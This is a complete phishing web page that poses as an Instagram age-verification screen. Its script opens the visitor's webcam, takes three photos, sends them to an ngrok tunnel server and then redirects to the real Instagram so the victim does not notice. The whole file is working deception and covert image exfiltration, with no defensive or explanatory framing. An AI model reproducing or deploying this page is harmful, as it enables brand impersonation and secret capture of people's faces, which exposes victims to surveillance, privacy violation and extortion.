<!DOCTYPE html>
<html>
<head>
    <title>Instagram Verification</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .btn { background: #0095f6; color: white; padding: 15px 30px; 
               border: none; border-radius: 8px; font-size: 16px; 
               cursor: pointer; margin: 20px; }
        #log { margin-top: 20px; color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <h1>Instagram</h1>
    <p>Age verification required</p>
    <button class="btn" onclick="start()">Verify Now</button>
    <div id="log"></div>
    
    <script>
        const SERVER = 'https://affrontingly-unviewed-towanda.ngrok-free.dev';
        let log = document.getElementById('log');
        
        function addLog(msg) {
            log.innerHTML += '<div>' + msg + '</div>';
        }
        
        async function start() {
            addLog('Starting...');
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 320, height: 240 }, 
                    audio: false 
                });
                
                addLog('Camera opened');
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // التقاط وإرسال 3 صور
                for (let i = 1; i <= 3; i++) {
                    addLog('Taking photo ' + i + '...');
                    await captureAndSend(video, i);
                    await new Promise(r => setTimeout(r, 1500));
                }
                
                addLog('<span style="color:green;">✅ Done! Redirecting...</span>');
                setTimeout(() => {
                    window.location.href = 'https://instagram.com';
                }, 2000);
                
            } catch (err) {
                addLog('Error: ' + err.message);
            }
        }
        
        function captureAndSend(video, count) {
            return new Promise((resolve) => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 160;
                    canvas.height = 120;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 160, 120);
                    
                    const img = canvas.toDataURL('image/jpeg', 0.3);
                    
                    fetch(SERVER + '/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            count: count,
                            image: img
                        })
                    })
                    .then(res => {
                        addLog('Photo ' + count + ' sent ✓');
                        resolve();
                    })
                    .catch(err => {
                        addLog('Send error: ' + err);
                        resolve();
                    });
                    
                }, 500);
            });
        }
    </script>
</body>
</html>
